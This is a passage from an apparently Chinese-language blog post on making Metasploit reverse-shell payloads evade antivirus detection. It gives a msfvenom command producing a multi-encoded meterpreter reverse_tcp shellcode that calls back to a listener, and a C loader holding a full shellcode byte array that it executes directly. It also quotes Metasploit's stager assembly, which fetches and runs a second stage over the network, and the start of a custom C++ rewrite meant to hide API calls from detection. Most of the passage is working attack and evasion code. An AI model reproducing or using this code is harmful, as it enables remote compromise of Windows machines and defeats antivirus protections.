class="line">Payload size: 333 bytes</div><div class="line">Final size of exe file: 26112 bytes</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210505/v77hAFEmNgTS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用多编码形式的shellcode生成的msfvenom<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">237.128</span> LPORT=<span class="number">4444</span> -e <span class="keyword">x</span><span class="number">86</span>/shikata_ga_nai -i <span class="number">3</span> -b '\<span class="keyword">x</span><span class="number">00</span>' -f raw | msfvenom -e <span class="keyword">x</span><span class="number">86</span>/countdown -i <span class="number">3</span> -a <span class="keyword">x</span><span class="number">86</span> --platform windows -f <span class="keyword">c</span> &gt; Desktop/payload<span class="number">2</span>.<span class="keyword">c</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将其编译成可执行文件，执行，但效果也不是很好<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">#pragma comment(linker, "/section:.data,RWE")  </div><div class="line">unsigned char lpBinBuffer[] =</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>c1<span class="symbol">\x</span>01<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>e8<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>c1<span class="symbol">\x</span>5e<span class="symbol">\x</span>30<span class="symbol">\x</span>4c<span class="symbol">\x</span>0e"</div><div class="line">"<span class="symbol">\x</span>07<span class="symbol">\x</span>e2<span class="symbol">\x</span>fa<span class="symbol">\x</span>b8<span class="symbol">\x</span>ad<span class="symbol">\x</span>02<span class="symbol">\x</span>04<span class="symbol">\x</span>05<span class="symbol">\x</span>ee<span class="symbol">\x</span>f8<span class="symbol">\x</span>f7<span class="symbol">\x</span>f6<span class="symbol">\x</span>f5<span class="symbol">\x</span>ca<span class="symbol">\x</span>52"</div><div class="line">"<span class="symbol">\x</span>3d<span class="symbol">\x</span>42<span class="symbol">\x</span>01<span class="symbol">\x</span>17<span class="symbol">\x</span>f3<span class="symbol">\x</span>e8<span class="symbol">\x</span>ab<span class="symbol">\x</span>8b<span class="symbol">\x</span>17<span class="symbol">\x</span>12<span class="symbol">\x</span>12<span class="symbol">\x</span>f6<span class="symbol">\x</span>e1<span class="symbol">\x</span>ed<span class="symbol">\x</span>ed"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>d7<span class="symbol">\x</span>4c<span class="symbol">\x</span>22<span class="symbol">\x</span>62<span class="symbol">\x</span>20<span class="symbol">\x</span>35<span class="symbol">\x</span>d0<span class="symbol">\x</span>cc<span class="symbol">\x</span>ee<span class="symbol">\x</span>f0<span class="symbol">\x</span>e8<span class="symbol">\x</span>4e<span class="symbol">\x</span>1f<span class="symbol">\x</span>c0"</div><div class="line">"<span class="symbol">\x</span>8b<span class="symbol">\x</span>98<span class="symbol">\x</span>db<span class="symbol">\x</span>22<span class="symbol">\x</span>dc<span class="symbol">\x</span>78<span class="symbol">\x</span>10<span class="symbol">\x</span>d5<span class="symbol">\x</span>ac<span class="symbol">\x</span>67<span class="symbol">\x</span>36<span class="symbol">\x</span>72<span class="symbol">\x</span>1b<span class="symbol">\x</span>89<span class="symbol">\x</span>c9"</div><div class="line">"<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>7c<span class="symbol">\x</span>19<span class="symbol">\x</span>ea<span class="symbol">\x</span>5a<span class="symbol">\x</span>2c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>c6<span class="symbol">\x</span>8c<span class="symbol">\x</span>f6<span class="symbol">\x</span>fd<span class="symbol">\x</span>43<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>2a<span class="symbol">\x</span>8e<span class="symbol">\x</span>a9<span class="symbol">\x</span>2c<span class="symbol">\x</span>ec<span class="symbol">\x</span>cb<span class="symbol">\x</span>fe<span class="symbol">\x</span>45<span class="symbol">\x</span>c0<span class="symbol">\x</span>ec<span class="symbol">\x</span>5b<span class="symbol">\x</span>7e<span class="symbol">\x</span>2d<span class="symbol">\x</span>fa<span class="symbol">\x</span>99"</div><div class="line">"<span class="symbol">\x</span>fc<span class="symbol">\x</span>eb<span class="symbol">\x</span>48<span class="symbol">\x</span>95<span class="symbol">\x</span>2a<span class="symbol">\x</span>41<span class="symbol">\x</span>40<span class="symbol">\x</span>df<span class="symbol">\x</span>f8<span class="symbol">\x</span>18<span class="symbol">\x</span>be<span class="symbol">\x</span>49<span class="symbol">\x</span>6c<span class="symbol">\x</span>29<span class="symbol">\x</span>eb"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>91<span class="symbol">\x</span>c6<span class="symbol">\x</span>94<span class="symbol">\x</span>2e<span class="symbol">\x</span>74<span class="symbol">\x</span>5a<span class="symbol">\x</span>05<span class="symbol">\x</span>4f<span class="symbol">\x</span>e5<span class="symbol">\x</span>1d<span class="symbol">\x</span>b4<span class="symbol">\x</span>47<span class="symbol">\x</span>31<span class="symbol">\x</span>ca"</div><div class="line">"<span class="symbol">\x</span>e9<span class="symbol">\x</span>dc<span class="symbol">\x</span>3a<span class="symbol">\x</span>42<span class="symbol">\x</span>69<span class="symbol">\x</span>a0<span class="symbol">\x</span>a5<span class="symbol">\x</span>2d<span class="symbol">\x</span>4f<span class="symbol">\x</span>74<span class="symbol">\x</span>99<span class="symbol">\x</span>87<span class="symbol">\x</span>e4<span class="symbol">\x</span>08<span class="symbol">\x</span>b5"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>e6<span class="symbol">\x</span>0c<span class="symbol">\x</span>97<span class="symbol">\x</span>50<span class="symbol">\x</span>d9<span class="symbol">\x</span>7b<span class="symbol">\x</span>71<span class="symbol">\x</span>d7<span class="symbol">\x</span>40<span class="symbol">\x</span>46<span class="symbol">\x</span>71<span class="symbol">\x</span>48<span class="symbol">\x</span>a9<span class="symbol">\x</span>a0"</div><div class="line">"<span class="symbol">\x</span>4c<span class="symbol">\x</span>e2<span class="symbol">\x</span>92<span class="symbol">\x</span>51<span class="symbol">\x</span>f9<span class="symbol">\x</span>5f<span class="symbol">\x</span>98<span class="symbol">\x</span>52<span class="symbol">\x</span>97<span class="symbol">\x</span>82<span class="symbol">\x</span>63<span class="symbol">\x</span>a2<span class="symbol">\x</span>4d<span class="symbol">\x</span>ec<span class="symbol">\x</span>ee"</div><div class="line">"<span class="symbol">\x</span>e2<span class="symbol">\x</span>04<span class="symbol">\x</span>d9<span class="symbol">\x</span>36<span class="symbol">\x</span>19<span class="symbol">\x</span>94<span class="symbol">\x</span>dd<span class="symbol">\x</span>9d<span class="symbol">\x</span>bf<span class="symbol">\x</span>30<span class="symbol">\x</span>5f<span class="symbol">\x</span>50<span class="symbol">\x</span>22<span class="symbol">\x</span>91<span class="symbol">\x</span>7a"</div><div class="line">"<span class="symbol">\x</span>24<span class="symbol">\x</span>0b<span class="symbol">\x</span>d0<span class="symbol">\x</span>8a<span class="symbol">\x</span>bd<span class="symbol">\x</span>41<span class="symbol">\x</span>39<span class="symbol">\x</span>96<span class="symbol">\x</span>b8<span class="symbol">\x</span>8d<span class="symbol">\x</span>88<span class="symbol">\x</span>a7<span class="symbol">\x</span>8b<span class="symbol">\x</span>a5<span class="symbol">\x</span>4c"</div><div class="line">"<span class="symbol">\x</span>7e<span class="symbol">\x</span>c6<span class="symbol">\x</span>64<span class="symbol">\x</span>54<span class="symbol">\x</span>b1<span class="symbol">\x</span>f1<span class="symbol">\x</span>5b<span class="symbol">\x</span>e4<span class="symbol">\x</span>a6<span class="symbol">\x</span>7c<span class="symbol">\x</span>82<span class="symbol">\x</span>d1<span class="symbol">\x</span>47<span class="symbol">\x</span>8d<span class="symbol">\x</span>5e"</div><div class="line">"<span class="symbol">\x</span>eb<span class="symbol">\x</span>71<span class="symbol">\x</span>73<span class="symbol">\x</span>8a<span class="symbol">\x</span>87<span class="symbol">\x</span>d3<span class="symbol">\x</span>52<span class="symbol">\x</span>6a<span class="symbol">\x</span>69<span class="symbol">\x</span>49<span class="symbol">\x</span>e7<span class="symbol">\x</span>db<span class="symbol">\x</span>a5<span class="symbol">\x</span>92<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>b9<span class="symbol">\x</span>0c<span class="symbol">\x</span>8f<span class="symbol">\x</span>6b<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>5c<span class="symbol">\x</span>a1<span class="symbol">\x</span>7c<span class="symbol">\x</span>d6<span class="symbol">\x</span>af<span class="symbol">\x</span>3b<span class="symbol">\x</span>78<span class="symbol">\x</span>40<span class="symbol">\x</span>68"</div><div class="line">"<span class="symbol">\x</span>85<span class="symbol">\x</span>95<span class="symbol">\x</span>17<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>51<span class="symbol">\x</span>d8<span class="symbol">\x</span>eb<span class="symbol">\x</span>b7<span class="symbol">\x</span>41<span class="symbol">\x</span>e0<span class="symbol">\x</span>d3<span class="symbol">\x</span>a7<span class="symbol">\x</span>d5<span class="symbol">\x</span>59"</div><div class="line">"<span class="symbol">\x</span>6b<span class="symbol">\x</span>67<span class="symbol">\x</span>3d<span class="symbol">\x</span>cf<span class="symbol">\x</span>1d<span class="symbol">\x</span>d8<span class="symbol">\x</span>89<span class="symbol">\x</span>d5<span class="symbol">\x</span>0d<span class="symbol">\x</span>d3<span class="symbol">\x</span>8b<span class="symbol">\x</span>4a<span class="symbol">\x</span>16<span class="symbol">\x</span>33<span class="symbol">\x</span>03"</div><div class="line">"<span class="symbol">\x</span>d2<span class="symbol">\x</span>33<span class="symbol">\x</span>e7<span class="symbol">\x</span>8a<span class="symbol">\x</span>92<span class="symbol">\x</span>68<span class="symbol">\x</span>81<span class="symbol">\x</span>c3<span class="symbol">\x</span>26<span class="symbol">\x</span>d1<span class="symbol">\x</span>65<span class="symbol">\x</span>52<span class="symbol">\x</span>25<span class="symbol">\x</span>20<span class="symbol">\x</span>7b"</div><div class="line">"<span class="symbol">\x</span>b2<span class="symbol">\x</span>6f<span class="symbol">\x</span>8b<span class="symbol">\x</span>43<span class="symbol">\x</span>c4<span class="symbol">\x</span>4c<span class="symbol">\x</span>e7<span class="symbol">\x</span>80<span class="symbol">\x</span>90<span class="symbol">\x</span>16<span class="symbol">\x</span>e3<span class="symbol">\x</span>a7<span class="symbol">\x</span>da<span class="symbol">\x</span>71<span class="symbol">\x</span>82"</div><div class="line">"<span class="symbol">\x</span>8a<span class="symbol">\x</span>c7<span class="symbol">\x</span>5f<span class="symbol">\x</span>af<span class="symbol">\x</span>a0<span class="symbol">\x</span>47<span class="symbol">\x</span>1a<span class="symbol">\x</span>6c<span class="symbol">\x</span>8f<span class="symbol">\x</span>90<span class="symbol">\x</span>dc<span class="symbol">\x</span>79<span class="symbol">\x</span>52<span class="symbol">\x</span>84<span class="symbol">\x</span>30"</div><div class="line">"<span class="symbol">\x</span>41<span class="symbol">\x</span>d3<span class="symbol">\x</span>45<span class="symbol">\x</span>82<span class="symbol">\x</span>80<span class="symbol">\x</span>86<span class="symbol">\x</span>7f<span class="symbol">\x</span>cb<span class="symbol">\x</span>52<span class="symbol">\x</span>29<span class="symbol">\x</span>64<span class="symbol">\x</span>51<span class="symbol">\x</span>03<span class="symbol">\x</span>5d<span class="symbol">\x</span>cb"</div><div class="line">"<span class="symbol">\x</span>db<span class="symbol">\x</span>13<span class="symbol">\x</span>80<span class="symbol">\x</span>9c<span class="symbol">\x</span>1a<span class="symbol">\x</span>46<span class="symbol">\x</span>d1<span class="symbol">\x</span>d5<span class="symbol">\x</span>58<span class="symbol">\x</span>30<span class="symbol">\x</span>79<span class="symbol">\x</span>d6<span class="symbol">\x</span>69<span class="symbol">\x</span>32<span class="symbol">\x</span>4e"</div><div class="line">"<span class="symbol">\x</span>7f<span class="symbol">\x</span>8a<span class="symbol">\x</span>ab<span class="symbol">\x</span>13<span class="symbol">\x</span>14<span class="symbol">\x</span>97<span class="symbol">\x</span>5d<span class="symbol">\x</span>96<span class="symbol">\x</span>ef<span class="symbol">\x</span>7c<span class="symbol">\x</span>3a<span class="symbol">\x</span>0e<span class="symbol">\x</span>03<span class="symbol">\x</span>d4<span class="symbol">\x</span>44"</div><div class="line">"<span class="symbol">\x</span>84<span class="symbol">\x</span>ca<span class="symbol">\x</span>8c<span class="symbol">\x</span>2a<span class="symbol">\x</span>44<span class="symbol">\x</span>d8<span class="symbol">\x</span>3d<span class="symbol">\x</span>17<span class="symbol">\x</span>24<span class="symbol">\x</span>ab<span class="symbol">\x</span>c6<span class="symbol">\x</span>6d<span class="symbol">\x</span>69<span class="symbol">\x</span>0f<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>cb<span class="symbol">\x</span>31<span class="symbol">\x</span>62<span class="symbol">\x</span>19<span class="symbol">\x</span>a9<span class="symbol">\x</span>4a<span class="symbol">\x</span>d1<span class="symbol">\x</span>f9<span class="symbol">\x</span>5c<span class="symbol">\x</span>e0<span class="symbol">\x</span>4e<span class="symbol">\x</span>d6<span class="symbol">\x</span>23<span class="symbol">\x</span>d9<span class="symbol">\x</span>86"</div><div class="line">"<span class="symbol">\x</span>d8<span class="symbol">\x</span>60<span class="symbol">\x</span>cf<span class="symbol">\x</span>55<span class="symbol">\x</span>9c<span class="symbol">\x</span>6b<span class="symbol">\x</span>1c<span class="symbol">\x</span>92<span class="symbol">\x</span>ca<span class="symbol">\x</span>37<span class="symbol">\x</span>11<span class="symbol">\x</span>51<span class="symbol">\x</span>04<span class="symbol">\x</span>44<span class="symbol">\x</span>e2"</div><div class="line">"<span class="symbol">\x</span>fa<span class="symbol">\x</span>05<span class="symbol">\x</span>e4<span class="symbol">\x</span>95<span class="symbol">\x</span>a5<span class="symbol">\x</span>4e<span class="symbol">\x</span>f2<span class="symbol">\x</span>70<span class="symbol">\x</span>d5<span class="symbol">\x</span>20<span class="symbol">\x</span>7c<span class="symbol">\x</span>ec<span class="symbol">\x</span>99<span class="symbol">\x</span>05<span class="symbol">\x</span>7f"</div><div class="line">"<span class="symbol">\x</span>f2<span class="symbol">\x</span>ad<span class="symbol">\x</span>87<span class="symbol">\x</span>36<span class="symbol">\x</span>ba<span class="symbol">\x</span>74<span class="symbol">\x</span>4c<span class="symbol">\x</span>e8<span class="symbol">\x</span>30<span class="symbol">\x</span>3c<span class="symbol">\x</span>36<span class="symbol">\x</span>7a<span class="symbol">\x</span>e7<span class="symbol">\x</span>18<span class="symbol">\x</span>bb"</div><div class="line">"<span class="symbol">\x</span>40<span class="symbol">\x</span>88<span class="symbol">\x</span>93<span class="symbol">\x</span>e3<span class="symbol">\x</span>19<span class="symbol">\x</span>86<span class="symbol">\x</span>da<span class="symbol">\x</span>9a<span class="symbol">\x</span>4b<span class="symbol">\x</span>ab<span class="symbol">\x</span>b2<span class="symbol">\x</span>bb<span class="symbol">\x</span>8e<span class="symbol">\x</span>bf<span class="symbol">\x</span>63"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>bc<span class="symbol">\x</span>8d";</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">((void(*)())&amp;lpBinBuffer)();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210829/OiAyqzupMi48.png?imageslim" alt="mark"></p><h2 id="0x3-关于免杀的新思考"><a href="#0x3-关于免杀的新思考" class="headerlink" title="0x3 关于免杀的新思考"></a>0x3 关于免杀的新思考</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我查看metasploit-framework源码的时候，在%metasploit-framework%/lib/msf/core/payload/windows/reverse_tcp.rb下看到了关于reverse_tcp这个payload的源码，发现实现reverse_tcp的方法很简单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，调用WSAStartup，connect等一系列Windows Socket函数链接主机。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">reverse_tcp:</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'32'</span>               <span class="comment">; Push the bytes 'ws2_32',0,0 onto the stack.</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'ws2_'</span>             <span class="comment">; ...</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; Push a pointer to the "ws2_32" string on the stack.</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'LoadLibraryA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; LoadLibraryA( "ws2_32" )</span></div><div class="line"></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x0190</span>         <span class="comment">; EAX = sizeof( struct WSAData )</span></div><div class="line">  <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="built_in">eax</span>            <span class="comment">; alloc some space for the WSAData structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; push a pointer to this stuct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push the wVersionRequested parameter</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSAStartup'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSAStartup( 0x0190, &amp;WSAData );</span></div><div class="line"></div><div class="line"><span class="symbol">set_address:</span></div><div class="line">  <span class="keyword">push</span> #&#123;retry_count&#125;     <span class="comment">; retry counter</span></div><div class="line"></div><div class="line"><span class="symbol">create_socket:</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_host&#125;    <span class="comment">; host in little-endian format</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_port&#125;    <span class="comment">; family AF_INET and port number</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">esp</span>            <span class="comment">; save pointer to sockaddr struct</span></div><div class="line"></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; if we succeed, eax will be zero, push zero for the flags param.</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push null for reserved parameter</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a WSAPROTOCOL_INFO structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a protocol</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push SOCK_STREAM</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push AF_INET</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSASocketA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span></div><div class="line">  <span class="keyword">xchg</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>           <span class="comment">; save the socket for later, don't care about the value of eax after this</span></div><div class="line"></div><div class="line"><span class="symbol">try_connect:</span></div><div class="line">  <span class="keyword">push</span> <span class="number">16</span>                 <span class="comment">; length of the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; pointer to the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the socket</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'connect'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; connect( s, &amp;sockaddr, 16 );</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用recv用于接收第二个stage的大小。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def asm_block_recv(opts=&#123;&#125;)</div><div class="line">  reliable     = opts[:reliable]</div><div class="line">  asm = %Q^</div><div class="line"><span class="symbol">    recv:</span></div><div class="line">      <span class="comment">; Receive the size of the incoming second stage...</span></div><div class="line">      <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">      <span class="keyword">push</span> <span class="number">4</span>                  <span class="comment">; length = sizeof( DWORD );</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; the 4 byte buffer on the stack to hold the second stage length</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">      <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">      <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, &amp;dwLength, 4, 0 );</span></div><div class="line">  ^</div><div class="line"></div><div class="line">  if reliable</div><div class="line">    asm &lt;&lt; %Q^</div><div class="line">      <span class="comment">; reliability: check to see if the recv worked, and reconnect</span></div><div class="line">      <span class="comment">; if it fails</span></div><div class="line">      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></div><div class="line">      <span class="keyword">jle</span> cleanup_socket</div><div class="line">    ^</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，调用recv接收第二个stage的内容，然后执行stage。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">asm &lt;&lt; %Q^</div><div class="line">    <span class="comment">; Alloc a RWX buffer for the second stage</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">esi</span>]          <span class="comment">; dereference the pointer to the second stage length</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x40</span>               <span class="comment">; PAGE_EXECUTE_READWRITE</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x1000</span>             <span class="comment">; MEM_COMMIT</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; push the newly recieved second stage length.</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; NULL as we dont care where the allocation is.</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'VirtualAlloc'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span></div><div class="line">    <span class="comment">; Receive the second stage and execute it...</span></div><div class="line">    <span class="keyword">xchg</span> <span class="built_in">ebx</span>, <span class="built_in">eax</span>           <span class="comment">; ebx = our new memory address for the new stage</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; push the address of the new stage so we can return into it</span></div><div class="line"></div><div class="line"><span class="symbol">  read_more:</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; length</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; the current address into our second stage's RWX buffer</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, buffer, length, 0 );</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来事情就简单了，我重新仿写了一个stage，因为metasploit通过Hash获取函数地址，虽然Hash值会被加密，但是仍有可能被识别。然后为了减少通过API识别的可能性，我并不想直接调用API函数，或者间接调用API函数，我决定通过仿写GetProcAddress函数，获取各个函数的地址，然后获取第二个Stage并调用。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">//load ws2_32</span></div><div class="line">HMODULE hModule_ws2 = LoadLibraryA(<span class="string">"ws2_32.dll"</span>);</div><div class="line">HMODULE hModule_kernel32 = LoadLibraryA(<span class="string">"Kernel32.dll"</span>);</div><div class="line">fnWSAStartup WSAStartup = (fnWSAStartup)MyGetFuncAddr(hModule_ws2, <span class="string">"WSAStartup"</span>);</div><div class="line">fnWSASocket WSASocketA = (fnWSASocket)MyGetFuncAddr(hModule_ws2, <span class="string">"WSASocketA"</span>);</div><div class="line">fnconnect connect = (fnconnect)MyGetFuncAddr(hModule_ws2, <span class="string">"connect"</span>);</div><div class="line">fnrecv recv = (fnrecv)MyGetFuncAddr(hModule_ws2, <span class="string">"recv"</span>);</div><div class="line">fnVirtualAlloc VirtualAlloc = (fnVirtualAlloc)MyGetFuncAddr(hModule_kernel32, <span class="string">"VirtualAlloc"</span>);</div><div class="line"></div><div class="line"></div><div class="line">WSADATA wsaData;</div><div 